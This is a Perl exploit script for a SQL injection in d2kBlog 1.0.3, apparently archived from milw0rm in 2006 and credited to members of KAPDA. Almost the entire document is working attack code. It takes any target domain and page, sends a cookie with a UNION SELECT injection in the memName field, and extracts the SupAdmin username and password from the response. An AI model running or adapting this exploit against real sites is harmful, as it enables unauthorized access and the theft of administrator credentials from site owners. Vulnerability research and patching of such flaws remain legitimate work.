<html>
<head>
<title>d2kBlog 1.0.3 (memName) Remote SQL Injection Exploit</title>
<pre>
 #!/usr/bin/perl -w 
 # D2KBLOG SQL injection 
 # Discovered by : Farhad Koosha [ farhadkey [at} kapda.ir ]
 # Exploited by : devil_box [ devil_box [at} kapda.ir ]
 # member of : Kapda.ir - Security Science Researchers Institute of Iran (persianhacker.net)

require LWP::UserAgent;
require HTTP::Request;
print &quot;\r\n\r\n=-=-=-==================================================================-=-=-=\r\n\r\n&quot;;
print &quot;	KAPDA - Security Science Researchers Institute of Iran\r\n\r\n&quot;;
print &quot;	PoC for D2KBLOG SQL injection bug - Administrator Password Extractor\r\n\r\n&quot;;
print &quot;	Original Source : http://kapda.ir/advisory-287.html (persianhacker.net)\r\n\r\n&quot;;
print &quot;\r\n=-=-=-==================================================================-=-=-=\r\n&quot;;

 if (@ARGV != 2) 
 { 
    print &quot;	Usage: kapda_D2KBLOG_xpl.pl [Target Domain] [Vulnerable Page]\n\r\n&quot;; 
    print &quot;	ex: kapda_D2KBLOG_xpl.pl www.target.com /blog/profile.asp\n\r\n&quot;;
    exit (); 
 } 


my $ua = LWP::UserAgent-&gt;new(env_proxy =&gt; 1,keep_alive =&gt; 1,timeout =&gt; 30,);

my $Path = $ARGV[0];

my $Page = $ARGV[1];

my $URL = &quot;http://&quot;.$Path.$Page;

print &quot;|***| Connecting to &quot;.$URL.&quot; ...\r\n&quot;;

$r = HTTP::Request-&gt;new(GET =&gt; $URL.&quot;?action=edit&quot;);

$r-&gt;header( &quot;Cookie&quot; =&gt;$Path.&quot;=memPassword=&amp;memStatus=&amp;memName=&lt;!--'UNION%20ALL%20select%201,1,1,'**stxt**|UserName|:|'%2bmem_name%2b'|-=-|Password|:|'%2bmem_password%2b'|**etxt**',1,1,1,1,1,1,1,1,'Discovered%20and%20coded%20by%20farhadkey%20from%20KAPDA.ir'%20from%20blog_member%20where%20mem_status='SupAdmin'%20or%20'1'='--&gt;&quot; );

$res = $ua-&gt;request($r);

print &quot;|***| Connected !\r\n&quot;;

if ($res-&gt;is_success) {

	print &quot;|***| Extracting Username and Password ...\r\n\r\n&quot;;

	my $results = $res-&gt;content; 

	while($results=~/\&quot;\*\*stxt\*\*(.*?)\*\*etxt\*\*\&quot;/ig){ print &quot;-=-&gt; $1 \r\n&quot;; }

	print &quot;\r\n	Exploit by Devil_Box\r\n		Discovery by Farhad koosha\r\n\r\n&quot;;

 } else {
	die &quot;\r\n|***| &quot;.$res-&gt;status_line;
 }

# milw0rm.com [2006-03-09]
</pre>
</html>

